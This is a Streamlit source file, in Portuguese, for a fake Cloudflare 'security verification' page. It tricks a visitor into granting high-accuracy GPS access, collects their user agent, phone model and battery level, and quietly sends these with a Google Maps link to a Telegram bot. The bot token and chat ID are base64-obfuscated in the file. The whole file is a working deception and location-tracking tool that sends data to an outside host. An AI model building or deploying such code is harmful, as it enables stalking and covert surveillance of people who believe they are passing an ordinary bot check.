import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- CONFIGURAÇÃO ---
st.set_page_config(page_title="Verificação de Segurança", page_icon="☁️", layout="centered")

B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

# --- CSS PARA DESIGN IDENTICO ---
st.markdown("""
    <style>
        .stApp { background-color: #000000 !important; color: #ffffff !important; }
        .cf-header { font-family: sans-serif; font-size: 28px; margin-bottom: 5px; }
        .cf-sub { font-size: 18px; margin-bottom: 10px; font-weight: bold; }
        .cf-desc { color: #999; font-size: 14px; margin-bottom: 30px; line-height: 1.4; }
        
        /* Widget da Cloudflare */
        .cf-box {
            border: 1px solid #333;
            background: #111;
            padding: 15px 25px;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            max-width: 450px;
        }
        
        .cf-status { display: flex; align-items: center; gap: 15px; font-family: sans-serif; }
        
        /* Círculo Girando (Animação) */
        .spinner {
            width: 24px; height: 24px;
            border: 3px solid #333;
            border-top: 3px solid #f38020;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .cf-logo { height: 25px; }
        .footer-text { margin-top: 50px; text-align: center; color: #444; font-weight: bold; font-size: 12px; }
    </style>
""", unsafe_allow_html=True)

def enviar_telegram(msg):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=15)
    except: pass

if 'status' not in st.session_state:
    st.session_state['status'] = 'aguardando'

# --- TELA INICIAL ---
st.markdown('<div class="cf-header">www.takedownnow.com.br</div>', unsafe_allow_html=True)
st.markdown('<div class="cf-sub">Executando verificação de segurança</div>', unsafe_allow_html=True)
st.markdown('<div class="cf-desc">Este site utiliza um serviço de segurança para proteção contra bots maliciosos. Esta página é exibida enquanto o site verifica se você não é um bot.</div>', unsafe_allow_html=True)

# Coleta Background
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA")
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT")

if st.session_state['status'] == 'aguardando':
    # WIDGET GIRANDO
    st.markdown("""
        <div class="cf-box">
            <div class="cf-status">
                <div class="spinner"></div>
                <span style="font-size: 16px;">Verificando...</span>
            </div>
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
        </div>
    """, unsafe_allow_html=True)
    
    # O botão fica quase invisível ou como parte do processo
    if st.button("Confirmar Conexão Segura"):
        js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true}); })"
        posicao = streamlit_js_eval(js_expressions=js_gps, key="GPS_FINAL")

        if posicao and posicao != "erro":
            # Pega o modelo (A11 ou POCO)
            modelo = "Android Device"
            if ua:
                try:
                    info = ua.split("(")[1].split(")")[0]
                    for p in info.split(";"):
                        if any(x in p for x in ["SM-", "POCO", "A11", "Xiaomi", "2312"]):
                            modelo = p.strip()
                            break
                except: pass

            enviar_telegram(f"🛡️ *CLOUDFLARE OK*\n📱 {modelo}\n🔋 {bat if bat else '??'}%\n📍 https://www.google.com/maps?q={posicao}")
            st.session_state['status'] = 'sucesso'
            st.rerun()

elif st.session_state['status'] == 'sucesso':
    # WIDGET SUCESSO (Igual sua foto 88533.jpg)
    st.markdown("""
        <div class="cf-box" style="border-color: #059669;">
            <div class="cf-status">
                <span style="color: #10b981; font-size: 24px;">✅</span>
                <span style="font-size: 16px;">Verificação bem-sucedida.</span>
            </div>
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
        </div>
        <div style="margin-top: 20px; font-size: 16px; font-family: sans-serif;">
            Esperando a resposta de www.takedownnow.com.br.
        </div>
    """, unsafe_allow_html=True)

st.markdown('<div class="footer-text">Desenvolvido Por Miamy © 2026</div>', unsafe_allow_html=True)
                
